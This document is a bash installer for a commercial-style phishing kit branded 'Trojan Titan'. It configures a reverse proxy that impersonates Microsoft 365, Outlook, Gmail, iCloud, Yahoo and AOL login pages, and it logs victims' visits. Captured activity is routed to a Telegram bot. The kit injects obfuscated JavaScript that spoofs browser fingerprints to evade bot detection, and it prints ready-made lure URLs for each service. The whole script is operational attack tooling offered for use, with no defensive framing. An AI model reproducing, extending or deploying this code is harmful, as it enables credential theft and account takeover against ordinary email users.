#!/bin/bash
# 🏛️ TROJAN - TITAN DEPLOYMENT (V15.1)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

# --- 1. PORT 80 CONFLICT MONITOR ---
show_header
echo -e "${CYAN}[...] Scanning Port 80 Status...${NC}"
CHECK_80=$(sudo lsof -t -i:80)
if [ ! -z "$CHECK_80" ]; then
    echo -e "${YELLOW}[!] PORT 80 BLOCKED BY PID: $CHECK_80${NC}"
    echo -e "${PURPLE}Trojan requires Port 80 to manage the initial HTTP Handshake and generate SSL certificates via Let's Encrypt.${NC}"
    read -p "Kill the process to allow Trojan to take control? (y/n): " KILL_IT
    if [[ "$KILL_IT" == "y" ]]; then
        sudo kill -9 $CHECK_80
        echo -e "${GREEN}[success] Port 80 Released.${NC}"
    else
        echo -e "${RED}[!] Error: Port 80 must be free for Trojan to function. Exiting.${NC}"
        exit 1
    fi
fi

# --- 2. SYSTEM PRE-FLIGHT (NODEJS 20 UPGRADE) ---
echo -e "${CYAN}[...] Validating System Dependencies...${NC}"
if ! command -v node &> /dev/null || [[ $(node -v | cut -d'.' -f1) != "v20" ]]; then
    echo -e "${YELLOW}[!] Updating Node.js to v20 (LTS) for Obfuscator compatibility...${NC}"
    curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - &> /dev/null
    sudo apt-get install -y nodejs &> /dev/null
fi
DEPS=(curl dig php screen jq npm)
for dep in "${DEPS[@]}"; do
    command -v $dep &> /dev/null || sudo apt-get install -y $dep &> /dev/null
done
command -v javascript-obfuscator &> /dev/null || sudo npm install -g javascript-obfuscator &> /dev/null

# --- 3. MASTER LICENSE ---
MASTER_KEY="TROJAN-PRO-2026"
read -p "ENTER MASTER LICENSE KEY: " USER_KEY
[[ $(echo "$USER_KEY" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[!] ACCESS DENIED${NC}"; exit 1; }

# --- 4. VERIFICATIONS (TELEGRAM / CLOUDFLARE / DNS) ---
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    echo -ne "${CYAN}[...] Verifying Bot Connection...${NC}\r"
    [[ $(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe") == *"\"ok\":true"* ]] && break || echo -e "${RED}[error] Bot Offline.${NC}"
done
read -p "Enter Telegram Chat ID: " TG_ID

while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    echo -ne "${CYAN}[...] Verifying CF Authentication...${NC}\r"
    [[ $(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN") == *"\"status\":\"active\""* ]] && break || echo -e "${RED}[error] CF Token Invalid.${NC}"
done

VPS_IP=$(curl -s https://api.ipify.org)
while true; do
    read -p "Enter Base Domain: " USER_DOMAIN
    USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')
    DNS_RESOLVE=$(dig +short "*.$USER_DOMAIN" | tail -n1)
    # UPDATED DNS CHECK: Allows VPS IP OR Cloudflare Proxy Ranges (104.x / 172.x)
    if [[ "$DNS_RESOLVE" == "$VPS_IP" ]] || [[ "$DNS_RESOLVE" == 104.* ]] || [[ "$DNS_RESOLVE" == 172.* ]]; then
        echo -e "${GREEN}[success] DNS Verified (Direct or Proxied).${NC}"
        break
    else
        echo -e "${RED}[error] DNS Mismatch ($DNS_RESOLVE). Ensure A-record points to $VPS_IP.${NC}"
    fi
done

read -p "Enter Path Slug: /" USER_SLUG
CLEAN_SLUG=$(echo "$USER_SLUG" | tr -dc 'a-zA-Z0-9')

# --- 5. POLYMORPHIC TELEMETRY ---
cat << 'EOF' > /tmp/raw_telemetry.js
(function() {
    setTimeout(function() {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        const getP = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(p) {
            if (p === 37445) return 'Intel Inc.';
            if (p === 37446) return 'Intel(R) Iris(TM) Graphics 6100';
            return getP.apply(this, arguments);
        };
        console.log("Trojan Telemetry: Latency Hook Active.");
    }, 2000);
})();
EOF
javascript-obfuscator /tmp/raw_telemetry.js --output /var/www/adobe_gui/js/akamai_fingerprint.js --compact true --self-defending true --string-array true --string-array-encoding 'base64'
rm /tmp/raw_telemetry.js

# --- 6. TROJAN CONFIG DEPLOYMENT ---
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "target": "login.microsoftonline.com",
  "log": "/root/hits.json",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "cfToken": "$CF_TOKEN",
  "cert": "/root/cert.pem",
  "key": "/root/key.pem",
  "target": "login.microsoftonline.com",
  "injectJs": "/var/www/adobe_gui/js/akamai_fingerprint.js",
  "proxyRules": [
    {"hostname": "$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.outlook.$USER_DOMAIN", "target": "outlook.live.com", "type": "proxy"},
    {"hostname": "*.gmail.$USER_DOMAIN", "target": "accounts.google.com", "type": "proxy"},
    {"hostname": "*.icloud.$USER_DOMAIN", "target": "www.icloud.com", "type": "proxy"},
    {"hostname": "*.yahoo.$USER_DOMAIN", "target": "login.yahoo.com", "type": "proxy"},
    {"hostname": "*.aol.$USER_DOMAIN", "target": "login.aol.com", "type": "proxy"}
  ]
}


EOF

# --- 7. TROJAN GHOST TERMINAL (RUN.SH) ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'
CONFIG="/root/config.json"
DOMAIN=$(jq -r '.proxyDomain' $CONFIG)
SLUG=$(jq -r '.slug' $CONFIG)
MASK=$(tr -dc '0-9' < /dev/urandom | head -c 10)
TOKEN=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 8)

clear
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${NC}  ${CYAN}TROJAN GHOST TERMINAL${NC}   | ${PURPLE}TARGETS:${NC} 06 | ${GREEN}STATUS: ONLINE${NC}      ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC} 01 | Office365 | https://$DOMAIN/s/?id=office&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 02 | Outlook   | https://$DOMAIN/s/?id=outlook&m=$MASK&s=$SLUG&t=$TOKEN ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 03 | Gmail     | https://$DOMAIN/s/?id=gmail&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 04 | iCloud    | https://$DOMAIN/s/?id=icloud&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 05 | Yahoo     | https://$DOMAIN/s/?id=yahoo&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 06 | AOL       | https://$DOMAIN/s/?id=aol&m=$MASK&s=$SLUG&t=$TOKEN     ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC}               ${YELLOW}LIVE ACTIVITY MONITOR (RECENT HITS)${NC}                ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
if [ -s /root/hits.json ]; then
    tail -n 5 /root/hits.json | jq -r '"║ \(.timestamp) | \(.target | ascii_upcase | .[0:8]) | \(.ip | .[0:15]) | \(.country | .[0:12]) ║"' 2>/dev/null
else
    echo -e "${BLUE}║${NC}        No activity detected yet. Waiting for Trojan...        ${BLUE}║${NC}"
fi
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"

sudo fuser -k 80/tcp 443/tcp 2>/dev/null
pkill -9 php
pkill -9 proxy
cd /root/engine/dist/ && ./proxy -config /root/config.json
EOF

chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run
echo -e "${GREEN}[success] Trojan Titan Ready. Port 80 Clean. Type 'Run'.${NC}"
